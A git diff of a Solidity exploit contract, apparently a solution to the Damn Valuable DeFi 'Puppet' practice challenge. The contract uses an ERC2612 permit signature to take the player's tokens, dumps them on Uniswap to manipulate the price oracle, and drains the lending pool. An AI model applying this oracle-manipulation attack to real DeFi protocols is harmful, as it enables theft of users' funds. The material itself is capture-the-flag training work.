@@ -6,17 +6,29 @@ import "../DamnValuableToken.sol";
 
 
 contract HackPuppet {
-    PuppetPool pool;
-    DamnValuableToken token;
-    address uniswap;
 
-    constructor(PuppetPool _pool, DamnValuableToken _token, address _uniswap) {
-        pool = _pool;
-        token = _token;
-        uniswap = _uniswap;
-    }
+    constructor(
+        PuppetPool pool,
+        DamnValuableToken token,
+        address uniswap,
+        uint256 player_token_balance,
+        uint256 pool_token_balance,
+        uint256 deadline,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) payable {
+        // Using the permit function from ERC2612 to get the allowance needed for our transaction
+        token.permit(
+            tx.origin,
+            address(this),
+            player_token_balance,
+            deadline,
+            v,
+            r,
+            s
+        );
 
-    function hack(uint256 player_token_balance, uint256 pool_token_balance) external payable {
         // We're going to transfer the player tokens to this contract
         token.transferFrom(tx.origin, address(this), player_token_balance);
         // Need to approve uniswap to transfer our tokens
@@ -38,6 +50,4 @@ contract HackPuppet {
         token.transfer(tx.origin, token.balanceOf(address(this)));
     }
 
-    // Need to have a receive function in order to receive Ether
-    receive() external payable {}
 }
